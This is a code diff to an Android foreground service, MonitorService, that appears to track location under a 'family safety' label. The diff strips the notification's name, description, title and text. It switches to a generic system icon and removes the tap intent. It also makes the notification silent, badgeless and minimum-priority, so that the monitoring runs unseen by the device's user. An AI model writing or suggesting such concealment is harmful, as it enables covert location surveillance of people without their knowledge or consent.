@@ -343,10 +343,13 @@ class MonitorService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Android System Protection Service",
-                NotificationManager.IMPORTANCE_LOW
+                "System Service",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Monitors system health, location, and family safety."
+                description = "System Service"
+                setShowBadge(false)
+                setSound(null, null)
+                enableVibration(false)
             }
             notificationManager.createNotificationChannel(channel)
         }
@@ -359,12 +362,12 @@ class MonitorService : LifecycleService() {
         )
 
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Android System Active")
-            .setContentText("System health and location protection is active.")
-            .setSmallIcon(android.R.drawable.ic_menu_compass)
-            .setContentIntent(pendingIntent)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.sym_def_app_icon)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
 
         try {
